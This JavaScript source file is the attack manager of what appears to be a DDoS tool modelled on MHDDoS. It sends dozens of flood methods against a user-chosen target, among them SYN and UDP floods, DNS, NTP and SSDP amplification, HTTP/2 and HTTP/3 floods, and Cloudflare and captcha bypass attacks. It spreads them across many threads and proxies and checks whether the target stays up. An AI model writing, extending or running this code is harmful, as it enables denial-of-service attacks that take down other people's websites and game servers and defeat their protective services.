import { REQUESTS_SENT, BYTES_SENT } from '../utils/counter.js';
import { Tools } from '../utils/tools.js';
import { logger } from '../utils/logger.js';
import { startMonitoring } from '../utils/target-monitor.js';
import { ReportGenerator } from '../utils/report-generator.js';

// Layer 4 Methods
import {
    UDPFlood,
    TCPFlood,
    MinecraftFlood,
    MinecraftBot,
    SYNFlood,
    VSEFlood,
    TS3Flood,
    MCPEFlood,
    FiveMFlood,
    FiveMTokenFlood,
    CPSFlood,
    ConnectionFlood,
    OVHUDPFlood,
    DNSAmplification,
    NTPAmplification,
    SSDPAmplification
} from '../methods/layer4/index.js';

// Layer 7 Methods
import { 
    HTTPGetFlood, 
    HTTPPostFlood, 
    HTTPSlowAttack 
} from '../methods/layer7/http.js';

import { 
    HTTP2Flood, 
    HTTP2PostFlood, 
    HTTP2CFBypass 
} from '../methods/layer7/http2.js';

import { HTTP2EnhancedCFKiller } from '../methods/layer7/http2-enhanced.js';

import { 
    CloudflareBypass, 
    AdvancedBypass, 
    BotSimulation 
} from '../methods/layer7/bypass.js';

import {
    StressAttack,
    NullAttack,
    DynamicAttack,
    XMLRPCAttack,
    ApacheRangeAttack,
    CookieAttack
} from '../methods/layer7/advanced.js';

import {
    PrivacyPassBypass,
    CaptchaBypass,
    UltimateBypass
} from '../methods/layer7/privacy-captcha.js';

import {
    HTTP3Attack,
    HTTP3PostAttack
} from '../methods/layer7/http3.js';

import { CloudflareKiller } from '../methods/layer7/cloudflare-killer.js';

/**
 * Attack Manager - Coordinates all attack operations
 */
export class AttackManager {
    constructor(options) {
        this.target = options.target;
        this.method = options.method.toUpperCase();
        this.threads = options.threads || 100;
        this.duration = options.duration || 60;
        this.rpc = options.rpc || 1;
        this.proxies = options.proxies || null;
        this.userAgents = options.userAgents || [];
        this.referers = options.referers || [];
        
        this.active = false;
        this.attackThreads = [];
        this.startTime = null;
        this.statsInterval = null;
        this.monitorInterval = null;
        this.targetMonitor = null;
        this.enableMonitoring = options.enableMonitoring !== false; // Default true
    }

    /**
     * Start the attack
     */
    async start() {
        try {
            this.active = true;
            this.startTime = Date.now();
            this.autoStopTimeout = null;

            logger.info(`🎯 Starting ${this.method} attack on ${this.target}`);
            logger.info(`⚙️  Threads: ${this.threads}, Duration: ${this.duration}s`);
            if (this.proxies && this.proxies.length > 0) {
                logger.info(`🔄 Proxies: ${this.proxies.length} loaded`);
            } else {
                logger.warning(`⚠️  No proxies loaded! Attack may be less effective.`);
            }

            // Reset counters
            REQUESTS_SENT.reset();
            BYTES_SENT.reset();

            // Validate method before starting
            const testInstance = this.createAttackInstance();
            if (!testInstance) {
                throw new Error(`Invalid or unsupported method: ${this.method}`);
            }

            // BUG FIX: Create attack threads in batches for better performance
            const BATCH_SIZE = 50; // Create threads in batches of 50
            const createThreadBatch = (startIdx, endIdx) => {
                for (let i = startIdx; i < endIdx && i < this.threads; i++) {
                    try {
                        const attackInstance = this.createAttackInstance();
                        if (attackInstance) {
                            this.attackThreads.push(attackInstance);
                            attackInstance.start().catch(err => {
                                // Log errors but don't stop attack
                                logger.debug(`Thread ${i} error: ${err.message}`);
                            });
                        } else {
                            logger.debug(`Failed to create attack instance for thread ${i}`);
                        }
                    } catch (threadErr) {
                        logger.debug(`Error creating thread ${i}: ${threadErr.message}`);
                    }
                }
            };

            // Create threads in batches to prevent event loop blocking
            let batchIndex = 0;
            const createNextBatch = () => {
                const startIdx = batchIndex * BATCH_SIZE;
                const endIdx = startIdx + BATCH_SIZE;
                
                if (startIdx < this.threads) {
                    setImmediate(() => {
                        try {
                            createThreadBatch(startIdx, endIdx);
                            batchIndex++;
                            createNextBatch();
                        } catch (err) {
                            logger.error(`Error in batch ${batchIndex}: ${err.message}`);
                        }
                    });
                }
            };
            
            createNextBatch();

            // Start stats monitoring
            this.startStatsMonitoring();

            // Start target health monitoring
            if (this.enableMonitoring) {
                try {
                    const monitoring = await startMonitoring(this.target, 10);
                    this.targetMonitor = monitoring.monitor;
                    this.monitorInterval = monitoring.interval;
                } catch (err) {
                    logger.debug(`Could not start monitoring: ${err.message}`);
                }
            }

            // Auto-stop after duration
            this.autoStopTimeout = setTimeout(() => {
                try {
                    this.stop();
                } catch (err) {
                    logger.error(`Error in auto-stop: ${err.message}`);
                }
            }, this.duration * 1000);
        } catch (err) {
            logger.error(`Failed to start attack: ${err.message}`);
            this.active = false;
            throw err;
        }
    }

    /**
     * Create attack instance based on method
     */
    createAttackInstance() {
        const method = this.method;

        // Layer 4 Methods
        if (['UDP'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new UDPFlood(host, port, this.duration, this.proxies);
        }

        if (['TCP'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new TCPFlood(host, port, this.duration, this.proxies);
        }

        if (['MINECRAFT'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new MinecraftFlood(host, port, this.duration, 47, this.proxies);
        }

        if (['MCBOT'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new MinecraftBot(host, port, this.duration, 47, 'MHDDoS_');
        }

        if (['SYN'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new SYNFlood(host, port, this.duration, this.proxies);
        }

        if (['VSE'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new VSEFlood(host, port, this.duration, this.proxies);
        }

        if (['TS3'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new TS3Flood(host, port, this.duration, this.proxies);
        }

        if (['MCPE'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new MCPEFlood(host, port, this.duration, this.proxies);
        }

        if (['FIVEM'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new FiveMFlood(host, port, this.duration, this.proxies);
        }

        if (['FIVEM-TOKEN'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new FiveMTokenFlood(host, port, this.duration, this.proxies);
        }

        if (['CPS'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new CPSFlood(host, port, this.duration, this.proxies);
        }

        if (['CONNECTION'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new ConnectionFlood(host, port, this.duration, this.proxies);
        }

        if (['OVH-UDP'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new OVHUDPFlood(host, port, this.duration, this.proxies);
        }

        // Amplification Methods
        if (['DNS-AMP'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new DNSAmplification(host, port, this.duration, this.proxies);
        }

        if (['NTP-AMP'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new NTPAmplification(host, port, this.duration, this.proxies);
        }

        if (['SSDP-AMP'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new SSDPAmplification(host, port, this.duration);
        }

        // Layer 7 Methods
        if (['GET'].includes(method)) {
            return new HTTPGetFlood(
                this.target, 
                this.duration, 
                this.rpc, 
                this.userAgents, 
                this.referers, 
                this.proxies
            );
        }

        if (['POST'].includes(method)) {
            return new HTTPPostFlood(
                this.target, 
                this.duration, 
                this.rpc, 
                this.userAgents, 
                this.referers, 
                this.proxies
            );
        }

        if (['SLOW'].includes(method)) {
            return new HTTPSlowAttack(
                this.target, 
                this.duration, 
                this.userAgents, 
                this.proxies
            );
        }

        if (['HTTP2', 'HTTP2-GET'].includes(method)) {
            return new HTTP2Flood(
                this.target, 
                this.duration, 
                this.rpc, 
                this.userAgents, 
                this.referers, 
                this.proxies
            );
        }

        if (['HTTP2-POST'].includes(method)) {
            return new HTTP2PostFlood(
                this.target, 
                this.duration, 
                this.rpc, 
                this.userAgents, 
                this.referers, 
                this.proxies
            );
        }

        if (['HTTP2-CF', 'CFB'].includes(method)) {
            return new HTTP2CFBypass(
                this.target, 
                this.duration, 
                this.rpc, 
                this.userAgents, 
                this.referers, 
                this.proxies
            );
        }

        if (['HTTP2-ENHANCED'].includes(method)) {
            return new HTTP2EnhancedCFKiller(
                this.target, 
                this.duration, 
                this.rpc, 
                this.userAgents, 
                this.referers, 
                this.proxies
            );
        }

        if (['BYPASS', 'CFBUAM'].includes(method)) {
            return new AdvancedBypass(
                this.target, 
                this.duration, 
                this.rpc, 
                this.userAgents, 
                this.proxies
            );
        }

        if (['BOT'].includes(method)) {
            return new BotSimulation(
                this.target, 
                this.duration, 
                this.rpc
            );
        }

        if (['STRESS'].includes(method)) {
            return new StressAttack(
                this.target,
                this.duration,
                this.rpc,
                this.userAgents,
                this.referers,
                this.proxies
            );
        }

        if (['NULL'].includes(method)) {
            return new NullAttack(
                this.target,
                this.duration,
                this.rpc,
                this.userAgents,
                this.referers,
                this.proxies
            );
        }

        if (['DYN'].includes(method)) {
            return new DynamicAttack(
                this.target,
                this.duration,
                this.rpc,
                this.userAgents,
                this.referers,
                this.proxies
            );
        }

        if (['XMLRPC'].includes(method)) {
            return new XMLRPCAttack(
                this.target,
                this.duration,
                this.rpc,
                this.userAgents,
                this.referers,
                this.proxies
            );
        }

        if (['APACHE'].includes(method)) {
            return new ApacheRangeAttack(
                this.target,
                this.duration,
                this.rpc,
                this.userAgents,
                this.referers,
                this.proxies
            );
        }

        if (['COOKIE'].includes(method)) {
            return new CookieAttack(
                this.target,
                this.duration,
                this.rpc,
                this.userAgents,
                this.referers,
                this.proxies
            );
        }

        if (['HTTP3', 'HTTP3-GET'].includes(method)) {
            return new HTTP3Attack(
                this.target,
                this.duration,
                this.rpc,
                this.userAgents,
                this.referers,
                this.proxies
            );
        }

        if (['HTTP3-POST'].includes(method)) {
            return new HTTP3PostAttack(
                this.target,
                this.duration,
                this.rpc,
                this.userAgents,
                this.referers,
                this.proxies
            );
        }

        if (['PRIVACYPASS'].includes(method)) {
            return new PrivacyPassBypass(
                this.target,
                this.duration,
                this.rpc,
                this.userAgents,
                this.referers,
                this.proxies
            );
        }

        if (['CAPTCHA'].includes(method)) {
            return new CaptchaBypass(
                this.target,
                this.duration,
                this.rpc,
                this.userAgents,
                this.referers,
                this.proxies,
                {
                    service: '2captcha',
                    apiKey: process.env.CAPTCHA_API_KEY || '',
                    enabled: false
                }
            );
        }

        if (['CF-KILLER', 'CFKILLER', 'CLOUDFLARE-KILLER'].includes(method)) {
            return new CloudflareKiller(
                this.target,
                this.duration,
                this.rpc,
                this.userAgents,
                this.referers,
                this.proxies
            );
        }

        if (['ULTIMATE', 'ULTIMATE-BYPASS'].includes(method)) {
            return new UltimateBypass(
                this.target,
                this.duration,
                this.rpc,
                this.userAgents,
                this.referers,
                this.proxies,
                {
                    service: '2captcha',
                    apiKey: process.env.CAPTCHA_API_KEY || '',
                    enabled: false
                }
            );
        }

        if (['HEAD'].includes(method)) {
            // HEAD method can use GET flood with method override
            const attack = new HTTPGetFlood(
                this.target,
                this.duration,
                this.rpc,
                this.userAgents,
                this.referers,
                this.proxies
            );
            // Override method in the attack class
            attack.httpMethod = 'HEAD';
            return attack;
        }

        logger.error(`Unknown method: ${method}`);
        return null;
    }

    /**
     * Parse target into host and port
     */
    parseTarget() {
        try {
            if (this.target.includes('://')) {
                const url = new URL(this.target);
                const port = url.port || (url.protocol === 'https:' ? 443 : 80);
                return [url.hostname, parseInt(port)];
            }

            if (this.target.includes(':')) {
                const [host, port] = this.target.split(':');
                const parsedPort = parseInt(port);
                if (isNaN(parsedPort) || parsedPort < 1 || parsedPort > 65535) {
                    throw new Error(`Invalid port number: ${port}`);
                }
                return [host, parsedPort];
            }

            return [this.target, 80];
        } catch (err) {
            logger.error(`Failed to parse target '${this.target}': ${err.message}`);
            throw new Error(`Invalid target format: ${this.target}`);
        }
    }

    /**
     * Start statistics monitoring
     */
    startStatsMonitoring() {
        this.statsInterval = setInterval(() => {
            const elapsed = Math.floor((Date.now() - this.startTime) / 1000);
            const progress = Math.floor((elapsed / this.duration) * 100);

            logger.info(
                `📊 Progress: ${progress}% | ` +
                `Requests: ${Tools.humanFormat(REQUESTS_SENT.get() || 0)} | ` +
                `Data: ${Tools.humanBytes(BYTES_SENT.get() || 0)} | ` +
                `Time: ${elapsed}s / ${this.duration}s`
            );

            // Don't reset counters - keep accumulating for total stats
        }, 1000);
    }

    /**
     * Stop the attack
     */
    async stop() {
        try {
            if (!this.active) return;

            this.active = false;
            logger.info('🛑 Stopping attack...');

            // Clear auto-stop timeout
            if (this.autoStopTimeout) {
                try {
                    clearTimeout(this.autoStopTimeout);
                } catch (err) {
                    logger.debug(`Error clearing timeout: ${err.message}`);
                }
                this.autoStopTimeout = null;
            }

            // Stop all attack threads
            this.attackThreads.forEach((thread, index) => {
                try {
                    if (thread && typeof thread.stop === 'function') {
                        thread.stop();
                    }
                } catch (err) {
                    logger.debug(`Error stopping thread ${index}: ${err.message}`);
                }
            });

            // Clear attack threads array
            this.attackThreads = [];

            // Clear stats interval
            if (this.statsInterval) {
                try {
                    clearInterval(this.statsInterval);
                } catch (err) {
                    logger.debug(`Error clearing stats interval: ${err.message}`);
                }
                this.statsInterval = null;
            }

            // Clear monitoring interval
            if (this.monitorInterval) {
                try {
                    clearInterval(this.monitorInterval);
                } catch (err) {
                    logger.debug(`Error clearing monitor interval: ${err.message}`);
                }
                this.monitorInterval = null;
            }

            // Print monitoring summary
            if (this.targetMonitor) {
                try {
                    this.targetMonitor.printSummary();
                } catch (err) {
                    logger.debug(`Error printing summary: ${err.message}`);
                }
                this.targetMonitor = null;
            }

            // Force garbage collection if available
            if (global.gc) {
                try {
                    global.gc();
                    logger.debug('Garbage collection triggered');
                } catch (e) {
                    logger.debug('GC not available');
                }
            }

            logger.success('✅ Attack stopped successfully!');
            logger.info(`📊 Final Stats - Requests: ${Tools.humanFormat(REQUESTS_SENT.get() || 0)} | Data: ${Tools.humanBytes(BYTES_SENT.get() || 0)}`);
            
            // Generate attack report
            await this.generateReport();
        } catch (err) {
            logger.error(`Error stopping attack: ${err.message}`);
            // Force cleanup even if there's an error
            this.active = false;
            this.attackThreads = [];
            if (this.statsInterval) {
                clearInterval(this.statsInterval);
                this.statsInterval = null;
            }
            if (this.autoStopTimeout) {
                clearTimeout(this.autoStopTimeout);
                this.autoStopTimeout = null;
            }
        }
    }

    /**
     * Check if attack is active
     */
    isActive() {
        return this.active;
    }

    /**
     * Get current statistics
     */
    getStats() {
        const elapsed = this.startTime 
            ? Math.floor((Date.now() - this.startTime) / 1000)
            : 0;

        return {
            target: this.target,
            method: this.method,
            threads: this.threads,
            duration: this.duration,
            elapsed: elapsed,
            requestsSent: Tools.humanFormat(REQUESTS_SENT.get() || 0),
            bytesSent: Tools.humanBytes(BYTES_SENT.get() || 0)
        };
    }

    /**
     * Generate attack report
     */
    async generateReport() {
        try {
            const elapsed = this.startTime 
                ? Math.floor((Date.now() - this.startTime) / 1000)
                : this.duration;

            const reportData = {
                target: this.target,
                method: this.method,
                threads: this.threads,
                duration: this.duration,
                elapsed: elapsed,
                rpc: this.rpc,
                requestsSent: REQUESTS_SENT.get() || 0,
                bytesSent: BYTES_SENT.get() || 0,
                proxiesUsed: this.proxies ? this.proxies.length : 0,
                startTime: this.startTime ? new Date(this.startTime).toISOString() : new Date().toISOString(),
                endTime: new Date().toISOString()
            };

            const generator = new ReportGenerator(reportData);
            const report = await generator.generateReport();
            
            // Try to generate PDF if puppeteer is available
            if (report.html) {
                await generator.generatePDF(report.html);
            }
            
            return report;
        } catch (err) {
            logger.debug(`Report generation error: ${err.message}`);
            // Don't throw - report generation is optional
        }
    }
}
